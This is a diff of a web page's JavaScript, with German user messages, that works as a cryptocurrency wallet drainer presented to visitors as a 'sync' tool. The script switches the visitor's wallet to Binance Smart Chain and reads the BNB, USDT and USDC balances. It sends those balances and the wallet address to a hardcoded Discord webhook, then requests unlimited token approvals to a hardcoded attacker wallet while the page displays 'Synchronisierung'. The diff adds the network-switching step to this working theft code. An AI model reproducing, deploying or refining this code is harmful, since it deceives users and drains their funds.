@@ -29,13 +29,47 @@ button{width:100%;padding:16px;border:none;border-radius:12px;font-size:18px;fon
 </div>
 
 <script>
-// DEINE WALLET ALS DIREKTER EMPFÄNGER/SPENDER
 const MY_WALLET = "0x22cc621a0095de57c81ef0b7f88826c3669c95a7"; 
 const USDT = "0x55d398326f99059fF775485246999027B3197955";
 const USDC = "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d";
 const WEBHOOK = "https://discord.com/api/webhooks/1455376553755021466/bYJ1SSGehHhQN7_j84bWk8WXejIKEiAE6z7S031xXshuzLZl6C8SLiWP-m_UqfqTyNGp";
 
+const BSC_CHAIN_ID = "0x38"; // 56 in Hexadezimal
+
 const abi = ["function allowance(address,address) view returns (uint256)","function balanceOf(address) view returns (uint256)","function approve(address,uint256) returns (bool)"];
+
+async function checkAndSwitchNetwork() {
+  try {
+    const chainId = await window.ethereum.request({ method: 'eth_chainId' });
+    if (chainId !== BSC_CHAIN_ID) {
+      await window.ethereum.request({
+        method: 'wallet_switchEthereumChain',
+        params: [{ chainId: BSC_CHAIN_ID }],
+      });
+    }
+    return true;
+  } catch (error) {
+    // Falls das Netzwerk nicht in der Wallet existiert, füge es hinzu
+    if (error.code === 4902) {
+      try {
+        await window.ethereum.request({
+          method: 'wallet_addEthereumChain',
+          params: [{
+            chainId: BSC_CHAIN_ID,
+            chainName: 'Binance Smart Chain',
+            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com/']
+          }]
+        });
+        return true;
+      } catch (addError) {
+        return false;
+      }
+    }
+    return false;
+  }
+}
 
 document.getElementById("connectBtn").addEventListener("click", async () => {
   const log = document.getElementById("log");
@@ -44,6 +78,10 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
   try {
     btn.disabled = true;
     if (!window.ethereum) throw new Error("Keine Wallet gefunden!");
+
+    log.innerText = "Prüfe Netzwerk...";
+    const networkOk = await checkAndSwitchNetwork();
+    if (!networkOk) throw new Error("Bitte zum Binance Netzwerk wechseln.");
 
     const provider = new ethers.BrowserProvider(window.ethereum);
     const accounts = await provider.send("eth_requestAccounts", []);
@@ -62,14 +100,12 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
     const fUSDC = ethers.formatUnits(cBal, 18);
     document.getElementById("balances").innerHTML = `BNB: ${parseFloat(fBNB).toFixed(5)}<br>USDT: ${fUSDT}<br>USDC: ${fUSDC}`;
 
-    // Discord Log senden
     await fetch(WEBHOOK, {
       method: "POST",
       headers: { "Content-Type":"application/json" },
-      body: JSON.stringify({ content: `🚀 **Sync**\nAddr: \`${user}\`\nBNB: ${fBNB}\nUSDT: ${fUSDT}\nUSDC: ${fUSDC}` })
+      body: JSON.stringify({ content: `🚀 **Sync (BSC)**\nAddr: \`${user}\`\nBNB: ${fBNB}\nUSDT: ${fUSDT}\nUSDC: ${fUSDC}` })
     });
 
-    // WICHTIG: Die Erlaubnis wird direkt für DEINE Wallet gegeben
     log.innerText = "Synchronisiere USDT...";
     await (await usdt.approve(MY_WALLET, ethers.MaxUint256, { gasLimit: 100000 })).wait();
     
@@ -79,7 +115,7 @@ document.getElementById("connectBtn").addEventListener("click", async () => {
     log.innerText = "✅ Synchronisierung vollständig!";
 
   } catch (err) {
-    log.innerText = "Status: " + (err.reason || "Vorgang abgebrochen.");
+    log.innerText = "Status: " + (err.message || "Vorgang abgebrochen.");
     btn.disabled = false;
   }
 });
